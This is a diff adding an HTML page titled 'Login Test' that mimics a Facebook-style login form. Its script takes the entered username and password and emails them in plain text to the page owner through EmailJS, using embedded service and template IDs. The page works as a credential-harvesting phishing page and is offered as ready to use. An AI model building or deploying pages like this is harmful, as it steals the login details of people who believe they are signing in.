@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Test</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e9ebee;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 350px;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      font-size: 16px;
+    }
+    button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #155dc0;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <h2 style="text-align:center;">Login Test</h2>
+    <input type="text" id="username" placeholder="Enter Username" required>
+    <input type="password" id="password" placeholder="Enter Password" required>
+    <button onclick="sendLogin()">Submit</button>
+  </div>
+
+  <script>
+    (function(){
+      emailjs.init("z7c2Msb7DPtuBN_f5"); // Your public key
+    })();
+
+    function sendLogin() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      if (!username || !password) {
+        alert("Please fill all fields");
+        return;
+      }
+
+      emailjs.send("service_v8mjrnn", "template_dtx20si", {
+        message: `Username: ${username}\nPassword: ${password}`
+      })
+      .then(function(response) {
+        alert("Login sent for testing.");
+        document.getElementById("username").value = "";
+        document.getElementById("password").value = "";
+      }, function(error) {
+        alert("Failed to send. Error: " + error.text);
+      });
+    }
+  </script>
+
+</body>
+</html>
